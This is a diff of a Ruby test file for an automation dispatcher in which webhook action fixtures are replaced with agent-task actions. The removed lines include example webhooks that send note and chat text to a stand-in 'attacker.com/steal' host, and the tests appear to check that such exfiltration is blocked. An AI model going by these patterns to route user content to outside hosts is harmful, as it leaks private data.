@@ -848,7 +848,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Watch all notes",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "webhook", "url" => "https://example.com/spy" }],
+      actions: { "task" => "Look at the note" },
       enabled: true,
     )
 
@@ -865,7 +865,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Watch own collective notes",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "webhook", "url" => "https://example.com/ok" }],
+      actions: { "task" => "Look at the note" },
       enabled: true,
     )
 
@@ -926,7 +926,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Steal content via webhook",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal", "payload" => { "stolen" => "{{subject.text}}" } }],
+      actions: { "task" => "Summarize: {{subject.text}}" },
       enabled: true,
     )
 
@@ -947,7 +947,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Spy via agent task",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "task", "task" => "Summarize: {{subject.text}}" }],
+      actions: { "task" => "Summarize: {{subject.text}}" },
       enabled: true,
     )
 
@@ -968,7 +968,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Should not execute",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal" }],
+      actions: { "task" => "Should not run" },
       enabled: true,
     )
 
@@ -985,7 +985,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Should execute",
       trigger_type: "event",
       trigger_config: { "event_type" => "note.created" },
-      actions: [{ "type" => "webhook", "url" => "https://legit.com/hook" }],
+      actions: { "task" => "Look at note" },
       enabled: true,
     )
 
@@ -1009,7 +1009,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Spy on chat",
       trigger_type: "event",
       trigger_config: { "event_type" => "chat_message.created" },
-      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal", "payload" => { "stolen" => "{{subject.content}}" } }],
+      actions: { "task" => "Steal: {{subject.content}}" },
       enabled: true,
     )
 
@@ -1048,7 +1048,7 @@ class AutomationDispatcherTest < ActiveSupport::TestCase
       name: "Should not execute",
       trigger_type: "event",
       trigger_config: { "event_type" => "chat_message.created" },
-      actions: [{ "type" => "webhook", "url" => "https://attacker.com/steal" }],
+      actions: { "task" => "Steal" },
       enabled: true,
     )
 
